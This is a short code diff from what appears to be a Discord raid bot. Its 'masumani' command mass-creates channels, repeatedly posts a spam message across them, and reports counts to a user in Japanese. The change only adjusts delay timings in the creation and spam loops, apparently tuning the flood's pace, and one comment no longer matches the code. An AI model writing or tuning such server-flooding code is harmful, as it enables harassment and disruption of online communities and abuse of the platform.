@@ -151,7 +151,7 @@ async def masumani(ctx):
                 if not isinstance(r, Exception):
                     created_channels.append(r)
                     created_count += 1
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.1)
         await user.send(f'チャンネル作成: {created_count}個')
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
@@ -168,7 +168,7 @@ async def masumani(ctx):
                 try:
                     await channel.send(spam_message)
                     count += 1
-                    await asyncio.sleep(1)  # 各メッセージ間に0.5秒待機
+                    await asyncio.sleep(3)  # 各メッセージ間に0.5秒待機
                 except Exception as e:
                     await asyncio.sleep(1)  # エラー時は1秒待機
                     continue
